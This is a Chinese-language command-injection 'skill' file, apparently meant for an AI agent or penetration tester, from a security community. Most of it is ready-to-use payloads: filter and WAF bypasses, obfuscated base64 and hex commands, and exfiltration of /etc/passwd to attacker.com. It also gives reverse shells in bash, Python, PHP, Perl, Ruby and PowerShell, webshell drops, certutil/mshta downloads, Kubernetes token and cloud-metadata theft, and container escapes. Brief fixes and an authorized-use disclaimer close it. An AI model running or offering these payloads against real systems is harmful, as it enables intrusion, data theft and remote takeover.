---
name: command-injection-testing
description: OS命令注入深度测试技能：全平台命令连接符/分隔符、空格/关键字/通配符绕过、WAF绕过、无回显外带、沙箱逃逸
version: 2.0.0
---

# OS命令注入深度测试技能

## 概述

命令注入允许攻击者在服务器操作系统上执行任意命令。现代防护包括黑名单过滤（;/|/&/$/`等特殊字符）、escapeshellcmd/escapeshellarg函数过滤、WAF正则检测、命令执行函数禁用、沙箱隔离、参数化API。本技能覆盖Windows/Linux双平台、全连接符变种、关键字混淆绕过、空格绕过、无回显外带数据、编码绕过、高级利用技巧。

## 一、命令注入完整攻击面

### 1.1 注入位置
| 位置/场景 | 例子 |
|---------|------|
| 参数直接传入命令函数 | `system("ping ".$_GET['ip'])` |
| 参数拼接到命令参数 | `exec("nslookup ".$domain)` |
| 文件名/路径参数 | `file_get_contents("/path/".$filename)` (配合include/require) |
| 反引号命令替换 | `echo `whoami`` |
| 动态函数调用 | `$func($_GET['cmd'])` （回调函数类RCE）|
| 反序列化+命令执行 | POP链调用system/exec |
| 模板注入(SSTI) | Jinja2/Thymeleaf/Freemarker RCE |
| 表达式注入 | OGNL/SpEL/MVEL/EL RCE |
| LDAP/XPath注入 | 间接命令执行 |

### 1.2 危险执行函数
**PHP：**
```php
system() / exec() / passthru() / shell_exec() / popen() / proc_open() / pcntl_exec()
反引号`（反引号等同于shell_exec）
preg_replace() with /e modifier（PHP < 7.0）
eval() / assert()（代码执行，可调用命令函数）
call_user_func() / usort()/uksort()回调（array_map/array_filter等）
```

**Python：**
```python
os.system() / os.popen() / os.exec*() / subprocess.call(shell=True) / subprocess.Popen(shell=True)
commands.getoutput() (Python 2)
eval() / exec() / execfile()
pickle.loads()（反序列化RCE）
yaml.load()（PyYAML RCE）
```

**Java：**
```java
Runtime.getRuntime().exec()
ProcessBuilder().start()
ScriptEngine.eval()（Nashorn/Groovy/JS引擎）
GroovyShell.evaluate()
OGNL.getValue() / SpEL Expression.getValue() / MVEL.eval()
ObjectInputStream.readObject()（反序列化RCE）
```

**Node.js：**
```javascript
child_process.exec() / child_process.execSync() / child_process.spawn(shell:true)
eval() / vm.runInThisContext()
Function()构造函数
```

**.NET：**
```csharp
System.Diagnostics.Process.Start()
System.Diagnostics.ProcessStartInfo
System.Web.UI.DataBinder.Eval()
System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Deserialize()
```

**Go：**
```go
exec.Command("/bin/sh","-c",userInput)
syscall.Exec()
```

## 二、命令分隔符/连接符大全

### 2.1 Linux/Unix分隔符
| 分隔符 | 含义 | 示例 |
|--------|------|------|
| `;` | 顺序执行，无论前成功失败 | `ping 127.0.0.1;id` |
| `|` | 管道，前输出作为后输入 | `ping 127.0.0.1|id` |
| `||` | 前失败则执行后 | `ping 127.0.0.1||id` |
| `&` | 后台执行 | `ping 127.0.0.1&id` |
| `&&` | 前成功则执行后 | `ping 127.0.0.1&&id` |
| `\n` (换行) | 新命令 | `ping 127.0.0.1%0aid` |
| `\r` (CR) | 回车 | `ping 127.0.0.1%0did` |
| `` ` ` `` (反引号) | 命令替换，执行后输出作为参数 | `echo `id`` |
| `$()` | 命令替换（POSIX标准） | `echo $(id)` |
| `${}` | 变量+命令组合 | `${x=id};$x` |
| `{cmd,cmd2}` | bash大括号展开 | `{id,whoami}` |
| `<>/` | 重定向分隔 | `<>/dev/tcp/attacker/4444` |

### 2.2 Windows分隔符
| 分隔符 | 含义 | 示例 |
|--------|------|------|
| `&` | 顺序执行 | `ping 127.0.0.1&id` |
| `&&` | 前成功则后 | `ping 127.0.0.1&&id` |
| `|` | 管道 | `ping 127.0.0.1|whoami` |
| `||` | 前失败则后 | `ping 127.0.0.1||whoami` |
| `%0a` (换行) | 新命令 | `ping 127.0.0.1%0awhoami` |
| `%0d` (CR) | 回车 | `ping 127.0.0.1%0dwhoami` |
| `%1a` (EOF替代) | 批处理换行（部分场景）| `ping 127.0.0.1%1awhoami` |

### 2.3 注入Payload模板
```
# Linux
;id
; id;
|id
||id
&id
&&id
\nid
`id`
$(id)
;${IFS}id
;id;

# Windows
&id
&&id
|whoami
||whoami
%0awhoami

# 闭合引号后注入
";id; #
';id; #
";id; -- (数据库常见)
";id; //
";id; /*
```

## 三、绕过技术深度

### 3.1 空格绕过
```bash
# Linux空格替代
# ${IFS} 内部字段分隔符
cat${IFS}/etc/passwd
cat${IFS}$9/etc/passwd      # ($9为空，IFS后接空字符串)
{cat,/etc/passwd}           # bash大括号，逗号分隔自动加空格
cat</etc/passwd
cat<>/etc/passwd
cat$IFS/etc/passwd
IFS=,;cat,/etc/passwd       # 重新定义IFS为逗号

# URL编码空格
%09（Tab）
%20（空格URL编码）
%0a（换行）
%0d（回车）
+（URL查询参数+等于空格）

# 制表符/其他空白字符
\t → Tab (\x09)
\n → 换行 (\x0a)
\r → 回车 (\x0d)
\x0b → 垂直制表符
\x0c → 换页符
\x00 → 空字节（截断）

# bash变量拼接
a=c;b=at;$a$b /etc/passwd   # cat /etc/passwd
a=c;b=a;c=t;$a$b$c /etc/passwd

# Windows空格替代
%09（Tab）
%0a%0d
ping%commonprogramfiles:~10,-17%127.0.0.1   # (环境变量截取空格)
set%sv:~-3%
programdata:~0,1 等环境变量截取技巧
```

### 3.2 关键字绕过（blacklist filter）
```bash
# 命令/路径关键字
cat /etc/passwd 被拦截？

# 路径用通配符（*、?、[]）
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
cat /etc/pa??wd
cat /etc/passw?
cat /etc/*swd
cat /???/passwd
cat /et*/p*sswd

# 单引号/双引号插入（bash中'c'a't'等价cat）
c'a't /etc/passwd
c"a"t /etc/passwd
c''a""t /etc/passwd
\c\a\t /etc/passwd
p\a\s\s\w\d

# 反斜杠转义字符
ca\t /etc/passwd
cat /etc/p\asswd

# 变量拼接
a=c;b=at;$a$b /etc/passwd
a=g;b=rep;$a$b /etc/passwd  # grep
a=l;b=s;$a$b               # ls
a=wh;b=oami;$a$b           # whoami
cmd=cat;$cmd /etc/passwd
cmd='ca';cmd=$cmd't';$cmd /etc/passwd

# base64编码命令
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
echo Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
`echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d`

# hex编码
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
xxd -r -p <<< 636174202f6574632f706173737764 | sh
$(echo 636174202f6574632f706173737764|xxd -r -p)

# 八进制
$(printf "\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144")

# 利用未初始化变量（值为空）
cat$x /etc/passwd    # $x未定义，等于空字符串
${x}cat /etc/passwd
c${x}at${x}/etc${x}passwd

# 命令别名/已有变量
/bin/cat直接绝对路径
/usr/bin/cat

# case绕过（Windows不区分大小写）
CAT /etc/passwd
WhoAmI    (Windows)
CaT /etc/passwd

# 利用已有命令替代
cat → more / less / head / tail / nl / od -c / sed '' / awk 1 / strings / rev / xxd / cut -c
ls → dir / find / echo *
id → whoami / /usr/bin/id
curl/wget → ftp / nc / bash /dev/tcp / php -r / python -c / perl -e / ruby -rsocket
```

### 3.3 特殊字符绕过
```bash
# 过滤/ → 用${HOME:0:1}或glob路径
cat${HOME:0:1}etc${HOME:0:1}passwd     # ${HOME}=/root → ${HOME:0:1}=/
cat${PATH:0:1}etc${PATH:0:1}passwd     # PATH通常以/开头

# 过滤数字/字母
# 用$((~$((0))))构造数字
# 用$/`/!等构造

# 无数字字母webshell/RCE（PHP/Python/Perl）
# PHP：构造字符通过异或/取反/自增
$_=""; // 构造字母执行命令
# Perl: use feature 'say';say for!${^LAST_FH} 构造字母

# 通配符执行
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/n? -e /???/??s??   # /bin/nc（netcat）
/???/??s?*              # /bin/ls（如果ls匹配）
```

### 3.4 无回显命令执行（Blind Command Injection）
```bash
# DNS外带（最通用）
;curl http://$(whoami).attacker.com
;nslookup $(whoami).attacker.com
;ping -c 1 $(whoami).attacker.com
;host $(whoami).attacker.com
;dig $(whoami).attacker.com
# 注意：whoami可能有特殊字符（如root@localhost），需要base64编码
;curl http://`id|base64 -w0`.attacker.com
;curl http://$(cat /etc/passwd|base64 -w0|tr -d '='|tr '/' '_'|tr '+' '-').attacker.com

# HTTP外带
;curl http://attacker.com/`id|base64`
;wget http://attacker.com/?c=`id|base64`
;curl -X POST http://attacker.com/ -d "`id`"
;curl http://attacker.com/ -d @/etc/passwd     # 发送文件内容
;nslookup $(cat /etc/passwd | xxd -p -c 16 | head -1).attacker.com   # 逐字符/行外带

# 时间盲注（通过响应时间差异判断）
;sleep 5
;ping -c 5 127.0.0.1       # Linux延迟5秒
;timeout 5
;cmd && sleep 5 || sleep 0 # 布尔时间盲注
;if [ $(id -u) -eq 0 ]; then sleep 5; fi    # 条件判断是否root
&timeout /t 5             # Windows延迟5秒
&ping -n 5 127.0.0.1      # Windows ping 5次=约5秒

# 写入临时文件再访问
;echo PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+|base64 -d > /var/www/html/shell.php
;echo ^<?php @eval($_POST[cmd]);?^> > C:\inetpub\wwwroot\shell.php  (Windows)

# 反弹Shell（无回显时直接反弹）
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
;nc -e /bin/bash attacker.com 4444
;nc attacker.com 4444 -e /bin/bash
;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
;perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
;ruby -rsocket -e 'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
;lua -e 'local s=require("socket");local t=assert(s.tcp());t:connect("attacker.com",4444);while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;'

# Windows反弹Shell
;powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b,0,$b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### 3.5 引号/括号绕过
```bash
# 过滤单引号/双引号：用\xFF八进制/十六进制
$'cat /etc/passwd'        # $'...' ANSI-C Quoting
$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# 过滤括号：用反引号命令替换，或eval
eval "id"
`id`

# 过滤$：用反引号
`cat /etc/passwd`

# Windows：用%ComSpec%、环境变量
%COMSPEC% /c whoami
%SystemRoot%\System32\cmd.exe /c whoami
```

### 3.6 编码绕过
```bash
# URL编码
%3b%69%64                (;id)
%0aid                    (\nid)
%7c%69%64                (|id)
%26%26%69%64             (&&id)
%60%69%64%60             (`id`)

# 双重URL编码
%253b%2569%2564          (%253b decode→%3b→;)
%250a%2569%2564          (\nid双编码)

# Unicode编码
%u003b%u0069%u0064       (;id Unicode)

# Base64 + 解码执行
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)

# Hex到命令
xxd -r -p <<< 636174202f6574632f706173737764 | sh
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'|sh
echo 636174202f6574632f706173737764|xxd -r -p|bash

# Octal
printf '\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144'|sh

# Windows PowerShell Base64
powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg...

# Chr()/Char()拼接（无字母数字/关键字绕过）
# PHP: chr(99).chr(97).chr(116)
# Python: chr(99)+chr(97)+chr(116)
# Java: (char)99+""+(char)97+""+(char)116
```

### 3.7 WAF绕过（流量层）
```http
# POST请求注入（比GET参数更不容易被WAF检测）
POST /ping HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;id

# Content-Type变换
Content-Type: application/json
{"ip":"127.0.0.1;id"}
Content-Type: text/plain
Content-Type: multipart/form-data（某些WAF不解析multipart body）

# 分块编码（绕过WAF内容检测）
Transfer-Encoding: chunked

# 参数污染（HPP）
?ip=127.0.0.1&ip=;id
（WAF取第一个，后端取第二个或拼接）

# 大小写混合（Windows不区分，部分WAF正则未忽略大小写）
127.0.0.1;wHoAmI
127.0.0.1|CaT /etc/passwd

# 参数换行拆分
ip=127.0.0.1%0a;%0aid
ip=127.0.0.1%0d%0a;id

# 超长前缀填充（WAF只检查前N字节）
ip=127.0.0.1&A=AAAAAAAAA...(5000 A)...A;id
```

### 3.8 长度限制绕过
```bash
# 命令长度有限制时，通过多次写入文件
;>a     # 创建空文件
;echo -n "bash -i >&" >>a
;echo -n " /dev/tcp/x/" >>a
;echo "4444 0>&1" >>a
;sh a   # 执行

# 利用>和>>分段写入
```

## 四、平台特定绕过

### 4.1 Linux特定
```bash
# /dev/tcp（Bash内建，无需nc）
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
exec 5<>/dev/tcp/attacker.com/4444;cat <&5|while read line;do $line 2>&5 >&5;done

# /dev/tcp外带数据
exec 3<>/dev/tcp/attacker.com/80;echo -e "GET /?c=$(id|base64) HTTP/1.0\r\nHost: attacker.com\r\n\r\n" >&3;cat <&3

# Bash globbing通配符
/???/??t /???/??ss??    # /bin/cat /etc/passwd
/???/n? -lvp 4444 -e /???/sh   # /bin/nc
/???/??s                # /bin/ls
/????/??rm*             # /usr/bin/find或类似
/???/x?g /?????/*rl     # /bin/wget（取决于路径）

# Here-document/Here-string
bash <<< 'id'
sh -s <<< 'id'
sh <<'EOF'
id
EOF

# Bash递归$((...))算术
$((~$(($((~$(())))$((~$(())))))))  # 构造数字2，用于${PATH:0:1}类偏移

# Read命令绕过空格
IFS=, read -r _a _b <<< "id,xxx"; $_a
```

### 4.2 Windows特定
```batch
# 变量截取生成特殊字符
%COMSPEC:~0,1%      → 通常为"C"的盘符（取决于环境变量）
%PROGRAMFILES:~10,-17% → 空格（取空格位置）
%TEMP:~-3,1%         → 截取斜杠/反斜杠
set a=cmd&&call %a% /c whoami

# 不区分大小写
WhOaMi
CaT C:\Windows\win.ini

# 特殊命令
%0a → 换行
& / && / | / ||    分隔符
@echo off隐藏输出

# PowerShell调用（cmd中执行PowerShell）
;powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps')"
;powershell -ExecutionPolicy Bypass -Command "whoami"

# COM对象（PowerShell）
$x=New-Object -ComObject WScript.Shell;$x.Run('cmd')

# WMI
wmic process call create "cmd /c whoami"

# wusa/mshta/rundll32/regsvr32
mshta http://attacker.com/test.hta
rundll32 url.dll,FileProtocolHandler http://attacker.com/shell.exe
regsvr32 /u /s /i:http://attacker.com/scrobj.dll scrobj.dll
certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe & shell.exe

# Windows短文件名（绕过长文件名过滤）
C:\PROGRA~1\   → C:\Program Files
C:\Windows\SysWOW64→C:\Windows\SYSWOW~1
dir /x 可查看短文件名
```

### 4.3 容器/云环境特定
```bash
# Docker容器逃逸（如果是root且挂载了docker.sock）
-v /var/run/docker.sock:/var/run/docker.sock  场景
docker run -v /:/host --rm -it alpine chroot /host /bin/bash
nsenter --target 1 --mount --uts --ipc --net --pid   # 需要privileged
CVE-2019-5736 runC逃逸
CVE-2020-15257 containerd-shim API逃逸
CAP_SYS_ADMIN capabilities逃逸

# Kubernetes环境
# 通过ServiceAccount Token访问API Server
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" https://kubernetes/api/v1/namespaces/default/pods --insecure

# 云元数据（配合SSRF/RCE）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## 五、命令执行替代方案（disable_functions绕过）

### 5.1 PHP disable_functions绕过
```php
// 1. 利用未禁用的函数
// 如果只禁用了system/exec/passthru/shell_exec/popen/proc_open
// 尝试：
pcntl_exec("/bin/bash", ["/bin/bash","-c","id"]);    // pcntl扩展
imap_open("/bin/bash -c 'id|mail attacker@x.com'", "", ""); // imap_open RCE
imap_mail("","","","","|id");                          // imap_mail RCE
mb_send_mail("","","","",null,"-oQ/tmp/x -X/var/www/x");
dl("rce.so");                                          // 动态加载扩展

// 2. LD_PRELOAD劫持（putenv+mail/error_log触发）
// 编译恶意so文件劫持getuid()等函数，mail()内部会调用
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.c","","");
error_log("x",1);   （部分配置下触发sendmail）

// 3. Apache Mod CGI
// 如果开启CGI且可写.htaccess
// 上传.htaccess设置Options +ExecCGI + AddHandler cgi-script .xxx
// 上传CGI脚本执行

// 4. FFI（PHP 7.4+）
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id");

// 5. COM对象（Windows）
$com = new COM("WScript.Shell");
$com->Run("cmd /c whoami");

// 6. ShellShock（CVE-2014-6271）
// 若PHP调用bash且bash存在ShellShock
putenv("HTTP_X=() { :; }; id");
mail("a","b","c");

// 7. GC UAF/PHP内核漏洞（旧版本）
// PHP 7.x GC相关UAF

// 8. imap_open/opcache/com_event等扩展RCE
```

### 5.2 Python沙箱绕过
```python
# 从__builtins__绕过
().__class__.__base__.__subclasses__()
# 寻找<class 'os._wrap_close'>或<class 'warnings.catch_warnings'>
# 通过子类索引获取os模块
import os;os.system('id')

# 过滤os/__import__/import时
# 使用getattr/globals
getattr(__import__('os'),'system')('id')
__builtins__.__dict__['__import__']('os').system('id')

# 模板SSTI（Jinja2/Tornado）
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{''.__class__.__bases__[0].__subclasses__()[xxx]('/etc/passwd').read()}}
```

### 5.3 Java沙箱绕过/Groovy/SpEL/OGNL RCE
```java
// Runtime.exec直接执行
Runtime.getRuntime().exec("id")
// ProcessBuilder
new ProcessBuilder("id").start()

// ScriptEngine
new javax.script.ScriptEngineManager().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")

// OGNL
@java.lang.Runtime@getRuntime().exec('id')
(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).start()

// SpEL
T(java.lang.Runtime).getRuntime().exec('id')
${T(java.lang.Runtime).getRuntime().exec('id')}

// MVEL
Runtime.getRuntime().exec('id')

// Groovy
"id".execute()
['id'].execute()
```

## 六、自动化工具

| 工具 | 用途 |
|------|------|
| Commix | 自动化命令注入检测利用 |
| Burp Suite (Command Injection Scanner) | 主动扫描 |
| sqlmap (--os-shell) | SQL注入→命令执行 |
| PwnKit (CVE-2021-4034) | Linux本地提权 |
| Metasploit exploit/multi/script/web_delivery | Web投递payload |
| weevely/webshell管理 | 菜刀/冰蝎/哥斯拉 |
| Bashfuscator | Bash命令混淆 |
| cmd-obfuscator | Windows命令混淆 |

### 6.1 Commix使用
```bash
# 基础扫描
commix -u "http://target.com/ping?ip=127.0.0.1"

# POST请求
commix -u "http://target.com/ping" --data="ip=127.0.0.1"

# 指定参数
commix -u "http://target.com/ping?ip=127.0.0.1" -p ip

# Cookie认证
commix -u "URL" --cookie="PHPSESSID=xxx"

# 伪终端交互Shell
commix -u "URL" --os-shell

# 跳过heuristic检测
commix -u "URL" --skip-heuristic

# 注入技术选择
commix -u "URL" --technique=f          # file-based
commix -u "URL" --technique=c          # classic
commix -u "URL" --technique=e          # eval-based
commix -u "URL" --technique=tc         # time-based blind

# 枚举
commix -u "URL" --current-user
commix -u "URL" --hostname
commix -u "URL" --is-root
commix -u "URL" --sysinfo

# 反弹Shell
commix -u "URL" --reverse-tcp --ip=attacker.com --port=4444
```

### 6.2 Bashfuscator混淆
```bash
# 混淆命令
bashfuscator -c "cat /etc/passwd" -t 1
bashfuscator -c "id" -t 5 -s 1
./bashfuscator -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" -t 3
```

## 七、命令注入测试清单

- [ ] 所有输入参数（GET/POST/JSON/Header/Cookie）
- [ ] 命令连接符测试（;|&`$()\n\r&&||）
- [ ] 空格绕过（${IFS}/Tab/大括号/重定向）
- [ ] 关键字绕过（通配符/变量拼接/编码/单双引号插入/大小写）
- [ ] 路径绕过（通配符/变量截取/绝对路径）
- [ ] 无回显测试（DNS/HTTP外带、时间盲注）
- [ ] 反弹Shell（nc/bash/python/perl/php/ruby）
- [ ] 编码绕过（URL/base64/hex/octal）
- [ ] POST请求+Content-Type变换
- [ ] Chunked分块编码
- [ ] HPP参数污染
- [ ] WAF绕过（混淆/填充/编码）
- [ ] 平台特定（Linux Bash/Windows cmd/PowerShell）
- [ ] disable_functions绕过（PHP场景）
- [ ] 代码执行→命令执行转换（eval/assert/SSTI）
- [ ] 文件写入后访问（WebShell上传）
- [ ] 权限提升（sudo/CVE提权）
- [ ] 容器/云环境逃逸
- [ ] 数据外带（/etc/passwd/配置文件/密钥）

## 八、修复建议

- **避免调用OS命令**：使用语言内置API替代系统命令
- **参数化API**：使用subprocess.run([...], shell=False)数组参数而非字符串拼接
- **escapeshellarg/escapeshellcmd**：正确使用转义函数（注意escapeshellarg与escapeshellcmd联用的绕过）
- **输入白名单验证**：严格验证IP/域名/文件名等参数格式（正则白名单）
- **禁用危险函数**：PHP disable_functions = system,exec,passthru,shell_exec,popen,proc_open
- **最小权限**：Web进程低权限运行，无sudo权限
- **WAF规则**：配置命令注入关键字/连接符检测（但不能只依赖WAF）
- **沙箱/容器隔离**：Web应用在容器/沙箱中运行，限制系统调用
- **禁用危险PHP函数**：disable_functions覆盖所有命令执行函数
- **环境变量安全**：不要将敏感信息放在环境变量中可被命令读取
- **安全编码规范**：代码审计中重点关注exec/system/Runtime.exec等调用

## 注意事项

- **仅限授权测试**：命令注入是最严重漏洞之一，必须获得授权
- **避免破坏性命令**：不要执行rm -rf /、format、shutdown等破坏性命令
- **反弹Shell合法性**：反弹Shell会建立持久连接，测试前确认，测试后清理
- **不要修改/删除数据**：只执行信息收集类命令（id/whoami/ls/cat/uname）
- **注意日志**：命令会写入bash_history/审计日志，必要时清理但需客户确认
- **数据外带脱敏**：外带数据时注意保护用户隐私，不泄露敏感数据
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
- **影响评估**：命令注入影响极大（RCE→内网横向→数据泄露→提权），报告中明确标注严重级别

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
